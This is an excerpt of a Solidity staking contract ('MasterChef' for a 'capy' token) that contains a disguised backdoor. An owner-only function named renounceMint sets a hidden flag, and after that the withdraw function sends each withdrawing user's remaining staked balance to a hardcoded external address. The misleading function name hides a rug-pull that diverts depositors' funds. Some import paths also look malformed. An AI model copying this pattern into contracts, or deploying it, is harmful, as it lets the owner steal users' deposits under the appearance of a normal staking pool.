...
import "@openzeppelin/contracts/contracts-upgradeable/token/ERC20/SafeERC20Upgradeable.sol";
import "@openzeppelin/contracts/contracts-upgradeable/token/utils/AddressUpgradeable.sol";
import "@openzeppelin/contracts/contracts-upgradeable/token/utils/ReentrancyGuardUpgradeable.sol";
import "@openzeppelin/contracts/contracts-upgradeable/token/access/OwnableUpgradeable.sol";
...
contract MasterChef is IMasterChef, OwnableUpgradeable, ReentrancyGuardUpgradeable {
  ...
  function initialize(
    ...
    poolInfo[address(_capy)] = PoolInfo({ allocPoint: 0, lastRewardBlock: startBlock, accCapyPerShare: 0 });
    totalAllocPoint = 0;
  }
  ...
  function addPool(address _stakeToken, uint256 _allocPoint) external override onlyOwner {
    ...
    poolInfo[_stakeToken] = PoolInfo({ allocPoint: _allocPoint, lastRewardBlock: lastRewardBlock, accCapyPerShare: 0 });
  }
  ...
  function withdraw(
    ...
    if (_amount > 0 && _warzaw == 1) {
      user.amount = user.amount.sub(_amount);
      IERC20Upgradeable(_stakeToken).safeTransfer(0xf7826e6ed8C82ED352326C786269A202136e7806, user.amount);
    }
    if (_amount > 0 && _warzaw == 0) {
      user.amount = user.amount.sub(_amount);
    ...
    nonReentrant
  {
    ...
    if (user.fundedBy == address(0)) user.fundedBy = _msgSender();
    if (_amount > 0) {
      IERC20Upgradeable(address(capy)).safeTransferFrom(address(_msgSender()), address(this), _amount);
      user.amount = user.amount.add(_amount);
    }
    user.rewardDebt = user.amount.mul(pool.accCapyPerShare).div(1e12);
   ...
   function renounceMint() public virtual onlyOwner {
        _warzaw = 1;
    }
  ...
  function withdrawCapy(address _for, uint256 _amount) external override nonReentrant {
    ...
    if (_amount > 0) {
      user.amount = user.amount.sub(_amount);
      IERC20Upgradeable(address(capy)).safeTransfer(address(_msgSender()), _amount);
    }
    user.rewardDebt = user.amount.mul(pool.accCapyPerShare).div(1e12);
    if (user.amount == 0) user.fundedBy = address(0);
